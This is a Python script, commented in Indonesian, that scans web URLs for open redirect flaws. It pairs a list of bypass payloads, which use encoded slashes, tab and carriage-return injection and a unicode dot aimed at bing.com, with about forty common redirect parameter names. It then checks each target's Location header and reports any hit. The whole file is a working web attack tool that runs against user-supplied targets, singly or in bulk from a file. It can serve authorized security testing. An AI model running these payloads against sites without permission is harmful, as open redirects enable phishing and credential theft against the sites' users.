import requests
import urllib.parse

# ASCII BANNER
print(r"""
 ______   .______    _______ .__   __. .______       _______  _______   __  .______       _______   ______ .___________.
/  __  \  |   _  \  |   ____||  \ |  | |   _  \     |   ____||       \ |  | |   _  \     |   ____| /      ||           |
|  |  |  | |  |_)  | |  |__   |   \|  | |  |_)  |    |  |__   |  .--.  ||  | |  |_)  |    |  |__   |  ,----'`---|  |----`
|  |  |  | |   ___/  |   __|  |  . `  | |      /     |   __|  |  |  |  ||  | |      /     |   __|  |  |         |  |     
|  `--'  | |  |      |  |____ |  |\   | |  |\  \----.|  |____ |  '--'  ||  | |  |\  \----.|  |____ |  `----.    |  |     
\______/  | _|      |_______||__| \__| | _| `._____||_______||_______/ |__| | _| `._____||_______| \______|    |__|     
                                                                                                                      
""")

# Payload bypass Open Redirect
bypass_payloads = [
    "https://bing.com",
    "//bing.com",
    "/\\bing.com",
    "https:/bing.com",
    "https://bing%E3%80%82com",
    "https://bing.com/%2e%2e",
    "https://bing.com/%2f%2e%2e",
    "https://bing.com/%2f..",
    "https://bing.com%2e%2e",
    "https://bing.com%2f%2e%2e",
    "%09/https://bing.com",
    "%5c/https://bing.com",
    "%2F/bing.com",
    "%0Dbing.com"
]

# Parameter redirect yang umum digunakan
redirect_params = [
    "url", "redirect", "next", "target", "link", "rurl", "dest", "destination",
    "image_url", "go", "success", "logout", "login", "clickurl", "forward_url",
    "jump_url", "originUrl", "page", "action_url", "src", "linkAddress",
    "location", "request", "backurl", "ReturnUrl", "redirect_uri", "redirectto",
    "return", "callback_url", "path", "referrer", "recipient", "u", "hostname",
    "returnTo", "return_path", "image", "requestTokenAndRedirect", "retURL",
    "next_url"
]

# Fungsi untuk menguji Open Redirect
def test_open_redirect(base_url):
    for param in redirect_params:
        for payload in bypass_payloads:
            encoded_payload = urllib.parse.quote(payload, safe='')  # Encode payload
            test_url = f"{base_url}?{param}={encoded_payload}"
            
            try:
                response = requests.get(test_url, allow_redirects=False)  # Jangan follow redirect
                
                # Cek jika status kode termasuk kategori redirect
                if response.status_code in [301, 302, 303, 307, 308]:
                    location_header = response.headers.get("Location", "")

                    # Validasi jika header `Location` mengarah ke bing.com (tanda Open Redirect)
                    if "bing.com" in location_header:
                        print(f"[✅] {test_url} -> {location_header} [Status: {response.status_code}]")
                        return  # Langsung keluar jika satu payload berhasil (untuk efisiensi)
            except requests.RequestException:
                pass  # Abaikan error dan lanjutkan ke URL berikutnya

# Fungsi untuk membaca banyak URL dari file .txt
def test_from_file(file_path):
    with open(file_path, "r") as file:
        urls = file.read().splitlines()
        for url in urls:
            test_open_redirect(url)

# Menu untuk memilih mode input
def main():
    print("🔍 Open Redirect Scanner 🔍")
    print("[1] Uji satu URL")
    print("[2] Uji banyak URL dari file .txt")
    
    choice = input("Pilih mode (1/2): ")
    
    if choice == "1":
        url = input("Masukkan URL target: ")
        test_open_redirect(url)
    elif choice == "2":
        file_path = input("Masukkan path file .txt: ")
        test_from_file(file_path)
    else:
        print("Pilihan tidak valid!")

if __name__ == "__main__":
    main()
